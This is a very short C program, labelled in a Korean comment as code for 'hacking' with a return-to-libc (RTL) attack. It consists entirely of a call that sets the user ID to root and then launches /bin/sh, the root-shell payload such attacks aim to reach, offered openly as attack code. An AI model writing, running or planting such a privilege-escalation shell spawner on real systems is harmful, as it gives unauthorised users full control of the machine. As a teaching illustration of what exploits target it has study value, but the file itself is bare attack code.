//C언어 해킹 RTL공격
#include<stdio.h>
int main()
{
 setuid(0);
 system("/bin/sh");
}
